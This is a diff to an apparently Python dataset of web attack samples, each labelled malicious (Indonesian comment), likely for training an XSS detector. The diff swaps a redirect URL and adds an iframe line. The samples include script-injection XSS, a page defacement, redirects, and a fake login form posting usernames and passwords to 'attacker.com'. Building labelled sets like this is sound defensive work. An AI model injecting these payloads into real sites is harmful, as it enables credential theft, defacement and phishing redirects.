@@ -20,7 +20,8 @@ dataset = [
     "<a href='javascript:alert('XSS')'>Click</a>",
     "<form action='http://attacker.com' method='POST'><input type='text' name='user'><input type='password' name='pass'><input type='submit' value='Login'></form>",
     "<script>document.body.innerHTML='Hacked!';</script>",
-    "<script>window.location='https://imigrasipura.id/'</script>"
+    "<script>window.location='https://imigrasijayapura.id/'</script>",
+    "<iframe src=\"https://imigrasijayapura.id/\"></iframe>"
 ]
 labels = [1] * len(dataset)  # 1 berarti serangan (malicious)
 
